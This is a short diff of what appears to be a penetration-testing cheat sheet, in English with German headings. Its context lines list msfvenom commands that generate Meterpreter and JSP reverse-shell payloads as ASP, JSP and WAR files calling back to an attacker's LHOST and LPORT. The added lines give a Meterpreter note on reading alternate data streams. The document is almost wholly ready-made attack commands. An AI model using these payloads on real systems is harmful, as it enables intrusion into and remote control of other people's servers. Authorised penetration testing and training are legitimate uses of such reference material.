@@ -41,3 +41,8 @@ Name | Desc
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp > shell.asp` |  ASP
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.jsp` | JSP
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war` | WAR
+
+
+## Meterpreter
+### Zugriff auf Alternate Data Stream
+`cat <binary-name>:<ads-name>`
